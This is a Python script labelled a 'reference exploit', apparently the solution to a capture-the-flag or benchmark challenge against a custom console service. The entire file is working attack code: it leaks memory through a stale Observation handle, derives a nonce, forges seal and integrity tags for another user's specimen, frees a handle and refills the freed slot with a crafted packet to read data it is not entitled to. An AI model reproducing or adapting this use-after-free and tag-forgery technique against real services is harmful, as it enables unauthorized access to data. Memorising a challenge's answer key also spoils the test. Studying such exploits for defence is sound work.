#!/usr/bin/env python3
"""Reference exploit: stale Observation handle reinterpreted as PollenPacket."""
import os
import json
import struct
import sys
import urllib.request


class Console:
    def __init__(self, host):
        self.host = host
        self.session = self.request("/api/console/open", {})["session"]

    def request(self, path, payload):
        request = urllib.request.Request(
            f"http://{self.host}:8080{path}", data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(request, timeout=5) as response:
            return json.load(response)

    def run(self, line):
        return self.request("/api/console/command", {"session": self.session, "command": line})["reply"]

    def close(self):
        self.request("/api/console/close", {"session": self.session})


def exploit(host, target):
    c = Console(host)
    key = os.urandom(16).hex()
    own = int(c.run(f"SOW calibration {key}").split()[1])
    frame = int(c.run(f"OBSERVE {own} {key}").split()[1])
    leaked = bytes.fromhex(c.run(f"DUMP {frame}").split()[1])
    magic, _, seal = struct.unpack_from("<QQQ", leaked)
    own_atlas, target_atlas = atlas_words(own, target)
    nonce = seal ^ own_atlas ^ gate_word(own)
    target_seal = target_atlas ^ gate_word(target) ^ nonce
    description = f"specimen-{target}".encode()
    lineage = lineage_tag(target, target_seal, description)
    canopy = canopy_tag(target, lineage, nonce)
    victim = int(c.run(f"OBSERVE {target} -").split()[1])
    assert c.run(f"DROP {victim}") == "DROPPED"
    packet = bytearray(0x90)
    struct.pack_into("<QQQQQB", packet, 0, magic, target, target_seal, lineage, canopy, 1)
    packet[41:41 + len(description)] = description
    assert c.run(f"FILL {packet.hex()}").startswith("POLLEN ")
    result = c.run(f"VIEW {victim}")
    if not result.startswith("SPECIMEN "):
        raise RuntimeError(result)
    print(result.split(" ", 1)[1])
    c.close()


_atlas = None


def atlas_words(*ids):
    global _atlas
    size = 32 * 1024 * 1024
    positions = {id_: ((id_ * 0x9e3779b97f4a7c15 & ((1 << 64) - 1)) ^ (id_ >> 7)) % (size - 8) for id_ in ids}
    if _atlas is None:
        state = 0x8E2C71D4
        data = bytearray(size)
        for i in range(0, size, 4):
            state ^= (state << 13) & 0xffffffff
            state ^= state >> 17
            state ^= (state << 5) & 0xffffffff
            data[i:i + 4] = state.to_bytes(4, "little")
        _atlas = data
    return [int.from_bytes(_atlas[positions[id_]:positions[id_] + 8], "little") for id_ in ids]


def gate_eval(index, value):
    mask = (1 << 64) - 1
    state = (0xC81D3A4B9827E6F5 ^ ((index + 1) * 0x9E3779B97F4A7C15)) & mask
    for _ in range(8192):
        state ^= (state << 13) & mask
        state ^= state >> 7
        state ^= (state << 17) & mask
        key = state = state & mask
        state ^= (state << 13) & mask
        state ^= state >> 7
        state ^= (state << 17) & mask
        rotation = (state := state & mask) % 63 + 1
        state ^= (state << 13) & mask
        state ^= state >> 7
        state ^= (state << 17) & mask
        multiplier = ((state := state & mask) & 0xffffffff) | 1
        if multiplier & 0x80000000:
            multiplier -= 1 << 32
        value = ((value ^ key) << rotation | (value ^ key) >> (64 - rotation)) & mask
        value = (value * multiplier) & mask
    return value


def gate_word(specimen):
    return gate_eval(specimen % 160, specimen ^ 0x6D82C3A5B7F0419E)


def rotate_word(value, amount):
    mask = (1 << 64) - 1
    value &= mask
    return ((value << amount) | (value >> (64 - amount))) & mask


def lineage_tag(specimen, seal, description):
    mask = (1 << 64) - 1
    state = seal ^ 0xA0761D6478BD642F
    for index, byte in enumerate(description):
        state ^= (byte * 0x100000001B3) & mask
        state = (rotate_word(state, index % 23 + 5) + 0xE7037ED1A0B428DB) & mask
    for round_ in range(6):
        state = rotate_word(state ^ atlas_words(specimen + round_ * 17)[0], 7 + round_ * 3)
        state = (state * 0xD6E8FEB86659FD93) & mask
    return state


def canopy_tag(specimen, lineage, nonce):
    mask = (1 << 64) - 1
    leaf = gate_eval((specimen + 37) % 160, lineage ^ nonce ^ 0x8D58AC26AFE12B47)
    return rotate_word(leaf ^ atlas_words(specimen ^ lineage)[0], 17) * 0x9FB21C651E98DF25 & mask


if __name__ == "__main__":
    exploit(sys.argv[1], int(sys.argv[2]))
